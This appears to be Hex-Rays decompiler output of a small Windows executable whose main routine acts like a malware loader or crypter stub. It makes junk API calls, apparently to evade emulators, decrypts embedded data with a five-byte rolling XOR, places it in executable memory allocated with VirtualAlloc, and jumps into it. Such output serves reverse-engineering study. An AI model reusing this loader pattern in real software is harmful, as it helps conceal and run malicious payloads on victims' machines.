/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_1310E000(_BYTE *, int, int, _DWORD *, unsigned int, int);
// int __userpurge sub_1310E09B@<eax>(int@<eax>, int, int, int, int, int, int);
void __noreturn start(); // weak
// void __cdecl initterm(_PVFV *First, _PVFV *Last);
unsigned int sub_1310E629();
int nullsub_1(void); // weak
// unsigned int __cdecl controlfp(unsigned int NewValue, unsigned int Mask);
// int __stdcall WmiSetSingleInstanceW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __stdcall WmiReceiveNotificationsA(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl _getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak

//-------------------------------------------------------------------------
// Data declarations

// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern void (__cdecl __noreturn *exit)(int Code);
// extern void (__cdecl *_setusermatherr)(_UserMathErrorFunctionPointer UserMathErrorFunction);
// extern int *(__cdecl *_p__fmode)();
// extern int *(__cdecl *_p__commode)();
// extern _UNKNOWN adjust_fdiv; weak
// extern void (__cdecl *_set_app_type)(_crt_app_type Type);
// extern char *acmdln;
// extern HRESULT (__stdcall *SafeArrayGetUBound)(SAFEARRAY *psa, UINT nDim, LONG *plUbound);


//----- (1310E000) --------------------------------------------------------
int __cdecl sub_1310E000(_BYTE *a1, int a2, int a3, _DWORD *a4, unsigned int a5, int a6)
{
  int result; // eax
  __int16 v7; // [esp+10h] [ebp-Ch]
  _BYTE *i; // [esp+28h] [ebp+Ch]

  *a4 = a3;
  v7 = a5 % 5;
  for ( i = (_BYTE *)(a5 + a2); ; ++i )
  {
    result = a3--;
    if ( !result )
      break;
    *a1 = *(_BYTE *)(a6 + v7++) ^ *i;
    if ( v7 == 5 )
      v7 = 0;
    ++a1;
  }
  return result;
}

//----- (1310E09B) --------------------------------------------------------
int __userpurge sub_1310E09B@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  struct _STARTUPINFOA StartupInfo; // [esp+34h] [ebp-290h] BYREF
  unsigned int v13; // [esp+7Ch] [ebp-248h]
  BYTE *v14; // [esp+80h] [ebp-244h] BYREF
  unsigned int v15; // [esp+84h] [ebp-240h]
  int v16; // [esp+88h] [ebp-23Ch]
  int v17; // [esp+8Ch] [ebp-238h] BYREF
  int v18; // [esp+90h] [ebp-234h] BYREF
  char v19[20]; // [esp+94h] [ebp-230h] BYREF
  char v20[500]; // [esp+A8h] [ebp-21Ch] BYREF
  unsigned int v21; // [esp+29Ch] [ebp-28h]
  void **v22; // [esp+2A0h] [ebp-24h] BYREF
  int *v23; // [esp+2A4h] [ebp-20h]
  HMODULE ModuleHandleA; // [esp+2A8h] [ebp-1Ch]
  BYTE *v25; // [esp+2ACh] [ebp-18h] BYREF
  int v26; // [esp+2B0h] [ebp-14h]
  int v27; // [esp+2B4h] [ebp-10h] BYREF
  int v28; // [esp+2B8h] [ebp-Ch] BYREF
  BYTE *v29; // [esp+2BCh] [ebp-8h]
  int v30; // [esp+2C0h] [ebp-4h]
  void *retaddr; // [esp+2C8h] [ebp+4h] BYREF

  v19[3] = -38;
  SetErrorMode(0x5C000000u);
  WmiReceiveNotificationsA(0, v7, v20, a1);
  GetStartupInfoA(&StartupInfo);
  v16 = SafeArrayGetUBound(0, 0x6C000u, (LONG *)0x12C00) - 196199;
  v8 = WmiSetSingleInstanceW(86016, 0, 1560281088, 942080, 3604480);
  if ( v9 != 65798144 && v8 - 2147221095 == v16 )
  {
    v19[0] = -15;
    v19[1] = 28;
    v19[4] = 117;
    v16 -= 1827871472;
    v17 = *(_DWORD *)v16;
    sub_1310E000(&v17, (int)&v17, 4, &v28, 0, (int)v19);
    v22 = &retaddr;
    v19[2] = -26;
    StartupInfo.hStdOutput = *(HANDLE *)(v16 + 4);
    sub_1310E000(&StartupInfo.hStdOutput, (int)&StartupInfo.hStdInput, 4, &v28, 4u, (int)v19);
    v27 = *(_DWORD *)(v16 + 8);
    sub_1310E000(&v27, (int)&v25, 4, &v28, 8u, (int)v19);
    v23 = (int *)(v16 + 12);
    ModuleHandleA = GetModuleHandleA(0);
    StartupInfo.hStdError = ModuleHandleA + 1024;
    v13 = 12;
    v25 = (BYTE *)*v23;
    sub_1310E000(&v25, (int)&v22, 4, &v28, 0xCu, (int)v19);
    v25 = &v25[(_DWORD)ModuleHandleA];
    v13 += 4;
    v14 = (BYTE *)*++v23;
    sub_1310E000(&v14, (int)&(&v14)[v13 / 0xFFFFFFFC], 4, &v28, v13, (int)v19);
    v13 += 4;
    ++v23;
    v21 = 8 * v27 + 12;
    StartupInfo.lpReserved2 = (LPBYTE)VirtualAlloc(0, (SIZE_T)StartupInfo.hStdOutput + v21 + v17, 0x3000u, 0x40u);
    v29 = &v25[v21];
    v15 = v21;
    *(_DWORD *)&StartupInfo.wShowWindow = v21;
    v30 = 0;
    v26 = 0;
  }
  while ( 1 )
  {
    if ( *(BYTE **)&StartupInfo.wShowWindow != v14 )
      goto LABEL_7;
    if ( ++v30 == v27 )
      break;
    v25 = (BYTE *)*v23;
    sub_1310E000(&v25, (int)&(&v25)[v13 / 0xFFFFFFFC], 4, &v28, v13, (int)v19);
    v25 = &v25[(_DWORD)ModuleHandleA];
    v13 += 4;
    v14 = (BYTE *)*++v23;
    sub_1310E000(&v14, (int)&(&v14)[v13 / 0xFFFFFFFC], 4, &v28, v13, (int)v19);
    v13 += 4;
    ++v23;
    *(_DWORD *)&StartupInfo.wShowWindow = 0;
    v29 = v25;
LABEL_7:
    StartupInfo.lpReserved2[v26++] = *v29++;
    ++*(_DWORD *)&StartupInfo.wShowWindow;
    ++v15;
  }
  sub_1310E000(
    StartupInfo.lpReserved2,
    (int)&StartupInfo.lpReserved2[-v21],
    (int)StartupInfo.hStdOutput,
    &v18,
    v21,
    (int)v19);
  StartupInfo.dwYCountChars = (DWORD)(StartupInfo.lpReserved2 + 3920);
  StartupInfo.dwFlags = (DWORD)(StartupInfo.lpReserved2 + 3920);
  return ((int (__stdcall *)(char *, LPBYTE, int, HANDLE, char *, void **, int))(StartupInfo.lpReserved2 + 3920))(
           (char *)StartupInfo.hStdOutput + (unsigned int)StartupInfo.lpReserved2,
           StartupInfo.lpReserved2,
           v17,
           StartupInfo.hStdOutput,
           v19,
           v22,
           3309568);
}
// 1310E09B: could not find valid save-restore pair for ebx
// 1310E09B: could not find valid save-restore pair for edi
// 1310E0C2: variable 'v7' is possibly undefined
// 1310E11B: variable 'v9' is possibly undefined
// 13110128: using guessed type int __stdcall WmiSetSingleInstanceW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 13110130: using guessed type int __stdcall WmiReceiveNotificationsA(_DWORD, _DWORD, _DWORD, _DWORD);
// 1310E09B: using guessed type char var_21C[500];

//----- (1310E4E5) --------------------------------------------------------
void __noreturn start()
{
  char *v0; // esi
  HMODULE ModuleHandleA; // [esp-1Ch] [ebp-98h]
  int v2[3]; // [esp-Ch] [ebp-88h] BYREF
  void *First[2]; // [esp+0h] [ebp-7Ch] BYREF
  char *v4; // [esp+8h] [ebp-74h]
  char v5[4]; // [esp+Ch] [ebp-70h] BYREF
  void *v6; // [esp+10h] [ebp-6Ch] BYREF
  int v7; // [esp+14h] [ebp-68h]
  char v8[4]; // [esp+18h] [ebp-64h] BYREF
  char v9[4]; // [esp+1Ch] [ebp-60h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+20h] [ebp-5Ch] BYREF
  int *v11; // [esp+64h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+6Ch] [ebp-10h]
  int v13; // [esp+70h] [ebp-Ch]
  int v14; // [esp+74h] [ebp-8h]
  int v15; // [esp+78h] [ebp-4h]

  v14 = 14592;
  v13 = 15073280;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v11 = v2;
  v15 = 0;
  _set_app_type(_crt_gui_app);
  *_p__fmode() = 0;
  *_p__commode() = 0;
  First[0] = (void *)adjust_fdiv;
  nullsub_1();
  if ( !First[0] )
    _setusermatherr((_UserMathErrorFunctionPointer)0xDA00000);
  sub_1310E629();
  initterm((_PVFV *)First, (_PVFV *)First);
  v6 = First[0];
  _getmainargs(v9, v5, v8, First[0], &v6);
  initterm((_PVFV *)First, (_PVFV *)First);
  v0 = acmdln;
  v4 = acmdln;
  if ( *acmdln != 34 )
  {
    while ( (unsigned __int8)*v0 > 0x20u )
      v4 = ++v0;
    goto LABEL_8;
  }
  do
    v4 = ++v0;
  while ( *v0 && *v0 != 34 );
  if ( *v0 != 34 )
    goto LABEL_8;
  while ( 1 )
  {
    v4 = ++v0;
LABEL_8:
    if ( !*v0 || (unsigned __int8)*v0 > 0x20u )
    {
      StartupInfo.dwFlags = 0;
      GetStartupInfoA(&StartupInfo);
      ModuleHandleA = GetModuleHandleA(0);
      v7 = sub_1310E09B((int)ModuleHandleA, v2[0], v2[1], v2[2], (int)First[0], (int)First[1], (int)v4);
      exit(v7);
    }
  }
}
// 1310E4E5: using guessed type void __noreturn start();
// 1310E63E: using guessed type int nullsub_1(void);
// 13110198: using guessed type int __cdecl _getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1310E4E5: using guessed type _PVFV First[2];
// 1310E4E5: using guessed type char var_64[4];
// 1310E4E5: using guessed type char var_70[4];
// 1310E4E5: using guessed type char var_60[4];

//----- (1310E629) --------------------------------------------------------
unsigned int sub_1310E629()
{
  return controlfp(0x10000u, 0x30000u);
}

// nfuncs=8 queued=4 decompiled=4 lumina nreq=0 worse=0 better=0
// ALL OK, 4 function(s) have been successfully decompiled
